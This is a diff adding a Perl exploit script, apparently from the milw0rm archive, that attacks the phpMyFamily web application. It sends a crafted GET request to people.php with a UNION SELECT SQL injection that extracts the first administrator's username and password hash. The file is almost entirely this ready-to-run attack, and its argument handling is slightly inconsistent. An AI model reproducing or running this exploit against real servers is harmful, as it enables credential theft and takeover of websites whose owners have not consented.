@@ -1,0 +1,31 @@
+#!/usr/bin/perl -w
+# phpMyFamily Exploit injection
+# ==============================
+$banner = "phpMyFamily Exploit injection \n\n==============================
+\n\nINFGPG-Hacking&Security Research";
+# 
+# Greats: AresU (1st IndoSec Team),ADZ Security Team (has discovered bugs)
+# Info: 98.to/infamous
+
+use IO::Socket;
+if ($#ARGV<0){
+print "\n$banner";
+print "\n\n Usage: perl phpMyFamily.pl [host] [path] \n\n";
+exit;}
+
+$gen="%20UNION%20SELECT%20NULL,password,NULL,username,NULL,NULL,NULL,NULL,NUL
+L,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20family_users%20%20WH
+ERE%20admin='Y'%20LIMIT%201,1"; # This selects first admin with login &
+password hash :)
+
+$serius="GET $ARGV[1]/$ARGV[2]/people.php?person=00002'$gen HTTP/1.0\r\n\r\n";
+$muka=IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$ARGV[0]",PeerPort=>"80")
+or die "$ARGV[0]Connection Failed !!\n\n";
+
+$muka -> autoflush(1);
+print $muka "$serius";   
+print "[*]Sending exploit DONE \n\n";            
+sleep(7);
+close($muka);
+
+# milw0rm.com [2005-03-27]
